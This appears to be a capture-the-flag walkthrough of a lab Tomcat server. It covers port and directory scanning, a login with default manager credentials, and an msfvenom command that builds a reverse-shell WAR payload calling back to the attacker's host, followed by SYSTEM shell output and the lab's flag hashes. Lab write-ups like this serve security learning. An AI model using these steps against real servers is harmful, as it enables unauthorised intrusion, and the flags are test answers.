@@ -1,0 +1,57 @@
+I start off with an nmap:
+└─# nmap -sC -sV -A -v 10.10.10.95
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+I need to bruteforce the directories.
+└─# gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/directory-list-2.3-medium.txt
+/docs                 (Status: 302) [Size: 0] [--> /docs/]
+/examples             (Status: 302) [Size: 0] [--> /examples/]
+/manager
+
+And trying http://10.10.10.95:8080/manager/html am prompted to login. I google for the default tomcat creds and =>
+tomcat : s3cret let's me in.
+
+The next steps is to upload a .war payload:
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f war > shell.war
+
+I proceed to set a netcat listener, upload the generated war file, visit http://10.10.10.95:8080/shell/ and wait for a callback.
+
+C:\Users\Public\Documents>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+C:\Users\Administrator\Desktop>cd flags
+cd flags
+
+C:\Users\Administrator\Desktop\flags>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,601,461,248 bytes free
+C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
+type "2 for the price of 1.txt"
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
